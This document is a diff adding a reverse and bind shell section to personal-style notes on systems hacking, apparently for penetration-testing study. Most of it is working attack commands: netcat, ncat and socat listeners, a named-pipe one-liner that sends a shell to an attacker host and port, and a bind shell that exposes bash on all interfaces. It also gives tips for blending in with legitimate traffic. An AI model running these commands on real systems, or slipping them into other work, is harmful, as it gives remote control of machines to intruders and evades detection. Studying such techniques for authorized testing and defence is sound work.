@@ -1,5 +1,69 @@
 # Notes on systems hacking
 
+"If it’s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port."
+
+– [Reverse shell cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+| shell type | listener on |
+| ---------- | ----------- |
+| reverse shell | attacker's machine |
+| bind shell | target machine |
+
+## Netcat reverse shell
+
+### Listener
+
+```bash
+# listen for a connection on port 443
+# it's better to use known ports to blend in with legitimate traffic
+$ nc -lvnp 443
+
+# wrap nc with rlwrap for arrow keys, history, better interaction
+$ rlwrap nc -lnvp 443
+
+# ncat is improved version of netcat from the nmap project
+# provides extra features such as SSL encryption
+$ ncat --ssl -lnvp 4444
+```
+
+| Flag | Description |
+| ---- | ----------- |
+| -l   | listen for a connection |
+| -v   | verbose     |
+| -n   | skip DNS lookup |
+| -p   | port number |
+
+```bash
+# create a socket connection between two hosts
+# listen for a reverse shell, direct incoming data to the terminal
+# -d -d is for double verbosity level
+$ socat -d -d TCP-LISTEN:443 STDOUT
+```
+
+### Pipe reverse shell
+
+```bash
+# rm existing pipe, create two-way named FIFO pipe at /tmp/f,
+# cat output from the pipe, pipe output to shell instance,
+# redirect standard error to standard output (back to the attacker),
+# pipe shell's output through netcat to attacker's machine,
+# send output of commands back into the named pipe (bi-directional communication) 
+$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <attacker_ip> <attacker_port> >/tmp/f
+```
+
+### Bind shell
+
+Binding a port on the compromised system to expose a shell can lead to detection more easily because a bind shell must remain active and listen to connections.
+
+```bash
+# expose a bash shell on the target machine through a netcat listener on all interfaces
+# ports below 1024 will require netcat to be executed with elevated privileges, using port 8080 avoids this
+$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+
+# connect to the bind shell (skip DNS, verbose)
+$ nc -nv <target_ip> 8080
+```
+
 ## Metasploit
 
 #### Basic usage:
